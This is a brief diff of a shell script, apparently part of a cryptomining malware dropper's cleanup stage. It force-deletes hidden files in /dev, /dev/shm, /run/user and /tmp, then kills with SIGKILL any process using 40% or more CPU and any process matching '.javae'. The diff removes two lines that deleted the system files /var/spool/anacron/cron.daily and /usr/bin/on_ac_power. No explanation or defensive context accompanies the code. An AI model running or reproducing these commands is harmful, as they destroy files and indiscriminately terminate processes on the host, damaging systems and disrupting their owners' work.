@@ -36,8 +36,6 @@ rm -f /dev/.a
 rm -f /dev/shm/.a
 rm -f /run/user/1000/ntpclient
 rm -f /run/user/1000/Mozz
-rm -f /var/spool/anacron/cron.daily
-rm -f /usr/bin/on_ac_power
 rm -f /tmp/.dbused
 ps auxf|awk '{if($3>=40.0) print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep '.javae' | awk '{print $2}' | xargs -I % kill -9 %
